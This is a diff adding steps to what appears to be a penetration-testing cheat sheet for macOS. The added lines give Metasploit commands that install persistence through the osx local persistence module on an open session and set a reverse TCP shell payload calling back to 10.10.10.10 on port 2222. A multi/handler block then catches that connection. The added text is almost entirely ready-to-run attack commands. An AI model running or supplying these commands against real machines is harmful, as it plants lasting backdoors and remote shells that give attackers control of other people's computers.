@@ -163,7 +163,24 @@ use a osx exploit
 ```
 use exploit/osx/local/persistence
 show options
+set RUN_NOW true
+sessions -l
+set SESSION Nº
+show payloads
+set PAYLOAD osx/x86/shell_reverse_tcp
+set LHOST 10.10.10.10
+set LPORT 2222
+exploit
+```
+save to a notepad the comand to remove the servis from targer mac
 
+run the multihandler to resive the conection
+```
+use exploit/multi/handler 
+set PAYLOAD osx/x86/shell_reverse_tcp
+set LHOST 10.10.10.10
+set LPORT 2222
+exploit
 ```
 
 ## Pivoting (Post Explotation):
